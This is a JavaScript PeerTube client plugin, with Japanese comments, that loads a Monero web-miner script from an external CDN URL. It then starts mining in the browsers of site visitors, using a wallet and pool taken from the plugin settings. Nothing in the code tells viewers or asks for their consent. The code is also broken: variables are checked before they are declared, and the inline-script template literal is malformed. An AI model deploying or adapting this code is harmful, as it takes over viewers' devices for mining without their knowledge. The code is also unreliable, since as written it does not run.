async function register({ registerHook, peertubeHelpers }) {

peertubeHelpers.getSettings().then(
      s => {
      console.log('Initializing Monero miner client plugin...')

      if ( !s || !s['walletAddress'] || !s['poolAddress']) {
        console.error('Monero miner plugin: Required settings are missing.')
        return
      }

      // 外部スクリプトを挿入
      if ( !externalScript ) {
      const externalScript = document.createElement("script")
      externalScript.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"
      externalScript.async = false
      document.head.appendChild(externalScript)

      console.log("Waiting...")
      return
      }

      if ( !inlineScript ) {
      // 外部スクリプトのロード完了後に処理開始
        console.log("Mining script loaded successfully.")

        const inlineScript = document.createElement("script")
        // テンプレートリテラルとかいう反則じみた記述 知らなかった・・・
        inlineScript.textContent = `
            server =` s['webSocket']`;
            var pool =` s['poolAddress']`;
            var walletAddress =` s['walletAddress']`;
            var workerId =` "PeerTube-Miner"`;
            var threads =` s['threads']`;
            var password =` s['password']`;
            startMining(pool, walletAddress, workerId, threads, password)
            throttleMiner = 20;
        `
        document.body.appendChild(inlineScript)
        console.log("Mining started.")
      return
      }
    }
  )
}
export { register }
